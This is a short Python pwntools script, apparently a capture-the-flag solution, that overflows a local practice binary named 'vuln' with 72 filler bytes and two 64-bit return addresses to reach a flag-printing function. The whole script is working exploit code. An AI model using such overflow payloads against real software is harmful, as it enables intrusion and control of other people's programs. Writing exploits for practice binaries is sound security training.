#!/usr/bin/env python

from pwn import *

r = process("./vuln")
r.recvuntil("Welcome to 64-bit. Give me a string that gets you the flag: \n")
payload = (
    "A" * 72 +
    p64(0x4007cb) +
    p64(0x400767) 
)

r.sendline(payload)
print(r.recvall())

r.close()
